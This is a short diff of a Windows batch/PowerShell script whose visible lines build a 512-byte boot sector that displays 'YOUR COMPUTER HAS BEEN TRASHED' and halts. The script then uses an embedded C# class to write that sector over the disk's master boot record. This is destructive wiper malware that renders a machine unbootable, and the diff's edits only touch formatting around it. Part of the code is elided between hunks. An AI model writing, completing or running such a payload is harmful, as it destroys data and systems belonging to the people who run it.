@@ -1,4 +1,3 @@
-@echo off
 powershell -NoProfile -Command ^
 "$m='YOUR COMPUTER HAS BEEN TRASHED';^
 [byte[]]$h=0xB8,0x0E,0x00,0x8E,0xD8,0xBE,0x1F,0x7C,0xB4,0x0E,0xAC,0x3C,0x00,0x74,0x0A,0xCD,0x10,0xEB,0xF5,0xF4;^
@@ -24,4 +23,5 @@ if(h.IsInvalid)throw new IOException();
 if(!WriteFile(h,d,512,out uint w,IntPtr.Zero)||w!=512)throw new IOException();
 h.Close();}}'@;^
 [RawDiskAccess]::WriteMBR($d)"
+
 
